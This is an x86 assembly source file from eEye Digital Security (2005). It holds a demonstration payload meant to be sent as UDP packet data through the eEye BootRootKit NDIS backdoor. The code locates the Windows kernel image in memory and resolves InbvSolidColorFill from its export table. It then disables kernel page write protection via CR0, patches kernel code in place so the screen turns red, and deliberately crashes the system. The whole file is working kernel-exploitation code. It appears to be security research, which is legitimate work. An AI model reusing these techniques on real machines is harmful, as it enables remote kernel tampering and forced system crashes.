;===============================================================
; DemoRSoD.asm v2.0
;---------------------------------------------------------------
; Sample payload for executing through the eEye BootRootKit
; NDIS backdoor.  Designed for use as UDP packet payload data.
;
; Derek Soeder - eEye Digital Security - 08/17/2005
;===============================================================


.586p
.model tiny


;================================
CODE32 SEGMENT byte use32
;================================

ASSUME CS:nothing, DS:nothing, ES:nothing, FS:nothing, GS:nothing, SS:nothing

;---------------- eEye BootRootKit signature
;
; Padding tailored for a UDP packet with no IP options.
; The signature must appear at offset 55h within the Ethernet frame.
;

db 43 dup ('A')
db "eBR", 0EEh

;----------------

	cld

	;--- locate NTOSKRNL.EXE image base using non-optimized IDT#00h trick

	push		eax
	sidt		fword ptr [esp-2]
	pop		esi

	mov		ebx, [esi+4]				; high WORD of EBX = high WORD of interrupt gate offset
	mov		bx, [esi]				; low WORD of EBX = low WORD of offset

	mov		ecx, 00000FFFh				; ECX = 0FFFh (4KB-1)

	or		ebx, ecx
	inc		ebx					; round up to start of next 4KB page

	inc		ecx					; ECX = 1000h (4KB)

@mzloop:

	sub		ebx, ecx				; go back one 4KB page
	cmp		word ptr [ebx], 5A4Dh			; IMAGE_DOS_HEADER.e_magic == IMAGE_DOS_SIGNATURE ("MZ")
	jne		@mzloop

	mov		edx, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	cmp		edx, ecx				; arbitrary upper-bound on RVA of PE header
	jae		@mzloop
	cmp		edx, 40h				; lower-bound of RVA of PE header is sizeof(IMAGE_DOS_HEADER)
	jb		@mzloop

	cmp		dword ptr [ebx+edx], 00004550h		; IMAGE_NT_HEADERS.Signature == IMAGE_NT_SIGNATURE ("PE\0\0")
	jne		@mzloop

	;--- search for "InbvSolidColorFill" name in export directory

	mov		edi, [ebx+edx+78h]			; EBP = RVA of export directory (making some assumptions)
	add		edi, ebx				; now EBP points to export directory 

	xor		edx, edx
	mov		esi, [edi+20h]				; IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
	add		esi, ebx				; now ESI points to start of name RVA list

	; EBX = image base address of NTOSKRNL.EXE
	; EDX = index
	; ESI = pointer into export name list
	; EDI = pointer to NTOSKRNL export directory

@nameloop:

	inc		edx					; advance index (index is 0-based; we'll need to subtract later)

	lodsd							; EAX = RVA of export name string

	cmp		dword ptr [ebx+eax], 76626E49h		; Inbv...............
	jne		@nameloop
	cmp		dword ptr [ebx+eax+4], 696C6F53h	; ....Soli...........
	jne		@nameloop

	;--- calculate InbvSolidColorFill function pointer

	mov		esi, [edi+24h]				; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add		esi, ebx				; now ESI points to name ordinals list

	movzx		edx, word ptr [esi+edx*2-2]		; get "ordinal" corresponding to index of export name

	mov		esi, [edi+1Ch]				; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add		esi, ebx				; now ESI points to function RVA list

	add		ebx, [esi+edx*4]			; EBX = pointer to InbvSolidColorFill entry point

	;--- disable all page write protection (despite whatever the Intel docs say)

	mov		eax, cr0
	and		eax, NOT 00010000h
	mov		cr0, eax

	;--- search InbvSolidColorFill for "PUSH DWORD PTR [EBP+18h]" instruction (5th argument is color)

	mov		al, 0FFh				; FFh/6: PUSH mem
	push		40h
	pop		ecx
	mov		edi, ebx

@pushloop:

	repne scasb
	jne		@pushloop_done

	cmp		word ptr [edi], 01875h			; FF 75 18    PUSH DWORD PTR [EBP+18h]
	jne		@pushloop

		; change argument in InbvSolidColorFill's call to VidSolidColorFill to always be red

	mov		byte ptr [edi-1], 90h			; 90          NOP
	mov		word ptr [edi], 016Ah			; 6A 01       PUSH 1 (red)
	jmp		@rsod

@pushloop_done:

	;--- search InbvSolidColorFill for "MOV reg32, [EBP+18h]" instruction instead

@movloop:

	inc		ebx
	cmp		byte ptr [ebx], 8Bh			; 8Bh: MOV reg, mem
	jne		@movloop

	mov		ax, [ebx+1]
	and		al, NOT 38h				; zero out RRR (register) field of ModRM postbyte
	cmp		ax, 1845h				; 8Bh/01xxx101b/18h: MOV reg, [EBP+18h]
	jne		@movloop

	mov		al, [ebx+1]
	shr		al, 3
	and		al, 7					; get value of RRR field
	add		al, 58h					; 58h..5Fh: POP EAX..EDI

	mov		word ptr [ebx], 016Ah			; 6A 01       PUSH 1 (red)
	mov		[ebx+2], al				; 5x          POP reg

	;--- cause a "blue" screen

@rsod:

	db 0C4h, 0C4h
	db "eEye"

CODE32 ENDS

END
